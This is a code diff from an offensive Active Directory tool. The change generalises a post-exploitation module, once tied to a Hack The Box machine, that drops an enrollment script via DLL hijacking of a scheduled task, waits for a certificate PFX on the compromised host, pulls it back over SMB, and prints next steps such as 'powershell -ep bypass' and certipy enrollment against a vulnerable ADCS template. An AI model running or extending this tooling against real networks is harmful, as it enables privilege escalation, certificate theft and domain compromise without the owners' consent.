@@ -46,12 +46,14 @@ def _poll_enroll_outcome(
     timeout: int,
     deploy_marker: str = "",
     expect_user: str = "",
+    drop_path: str = r"C:\ProgramData",
 ) -> tuple[bool, str, list[str]]:
     """Wait for remote PFX; read enroll.log after deploy marker."""
     from admapper.adcs.enroll import parse_enroll_log
 
-    remote_pfx = f"C:\\ProgramData\\UpdateMonitor\\{dns_name}.pfx"
-    log_path = r"C:\ProgramData\UpdateMonitor\enroll.log"
+    drop = drop_path.rstrip("\\/")
+    remote_pfx = f"{drop}\\{dns_name}.pfx"
+    log_path = f"{drop}\\enroll.log"
     safe_pfx = remote_pfx.replace("'", "''")
     safe_log = log_path.replace("'", "''")
     deadline = time.time() + max(timeout, 0)
@@ -86,7 +88,11 @@ def _poll_enroll_outcome(
         since_marker=deploy_marker or None,
         expect_user=expect_user or None,
     )
-    errors = status.errors or (["PFX not issued within timeout — wait for UpdateChecker Agent task"] if not status.success else [])
+    errors = status.errors or (
+        ["PFX not issued within timeout — wait for the scheduled task to run"]
+        if not status.success
+        else []
+    )
     return False, last_log, errors
 
 
@@ -154,12 +160,14 @@ def parse_shell_username(probe_output: str) -> str:
 
 def _resolve_enroll_targets(session: Session) -> tuple[str, str, str]:
     """Return (dns_fqdn, ca_host, ca_name) from workspace intel."""
-    domain = (session.workspace.domain if session.workspace else None) or "logging.htb"
+    domain = (session.workspace.domain if session.workspace else None) or ""
+    if not domain:
+        raise RuntimeError("no domain set in workspace — cannot infer enrollment targets")
     ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
     dc_ip = pick_dc_ip(session)
-    dns = resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"DC01.{domain.lower()}"
-    prefix = domain.split(".")[0] if domain else "logging"
-    ca_name = f"{prefix}-DC01-CA"
+    dns = resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain.lower()}"
+    prefix = domain.split(".")[0] if domain else ""
+    ca_name = f"{prefix or 'AD'}-DC01-CA"
     inv_path = ws_path / "adcs_inventory.json"
     if inv_path.is_file():
         try:
@@ -207,8 +215,8 @@ def _handle_pivot_shell(session: Session, run_as_user: str, probe_output: str) -
         )
         script = certs_dir / f"enroll_{effective_user.replace('.', '_')}.ps1"
         script.write_text(ps + "\n", encoding="utf-8")
-        print_info(f"pivot shell as {effective_user} — NEXT: WSUS + UpdateSrv cert chain (Server Auth only)")
-        print_info("in shell: powershell -ep bypass -File C:\\ProgramData\\UpdateMonitor\\enroll.ps1")
+        print_info(f"pivot shell as {effective_user} — NEXT: WSUS + vulnerable template cert chain")
+        print_info("in shell: powershell -ep bypass -File <drop_path>\\enroll.ps1")
         print_info("or: admapper postex run --mode enroll (DLL auto-enroll on task trigger)")
         run_escalate_analysis(session, pivot_user=effective_user)
         result = run_certipy_enrollment(session, finding_id="adcs-002", dns_name=enroll_dns)
@@ -388,7 +396,7 @@ def run_dll_hijack(
         enroll_success = False
         enroll_log_excerpt = ""
         enroll_errors: list[str] = []
-        pfx_remote = f"C:\\ProgramData\\UpdateMonitor\\{enroll_dns}.pfx"
+        pfx_remote = f"{drop_path.rstrip('\\/')}\\{enroll_dns}.pfx"
         if payload_mode == "enroll" and not dry_run:
             enroll_success, enroll_log_excerpt, enroll_errors = _poll_enroll_outcome(
                 client,
@@ -396,13 +404,16 @@ def run_dll_hijack(
                 timeout=wait_seconds,
                 deploy_marker=deploy.enroll_deploy_marker,
                 expect_user=deploy.run_as_user,
+                drop_path=drop_path,
             )
             if enroll_success:
                 print_success(f"enroll issued PFX on target → {pfx_remote}")
                 try:
                     from admapper.adcs.runner import fetch_pfx_via_smb
 
-                    local_pfx = fetch_pfx_via_smb(session, remote_name=f"{enroll_dns}.pfx")
+                    local_pfx = fetch_pfx_via_smb(
+                        session, remote_name=f"{enroll_dns}.pfx", drop_path=drop_path
+                    )
                     if local_pfx:
                         print_success(f"PFX downloaded → {local_pfx}")
                 except Exception as exc:
@@ -414,7 +425,7 @@ def run_dll_hijack(
                     record_escalation_step(
                         session,
                         action="enroll_hijack",
-                        detail=f"UpdateSrv PFX as {deploy.run_as_user}",
+                        detail=f"enroll PFX as {deploy.run_as_user}",
                     )
                     session.persist_workspace()
             else:
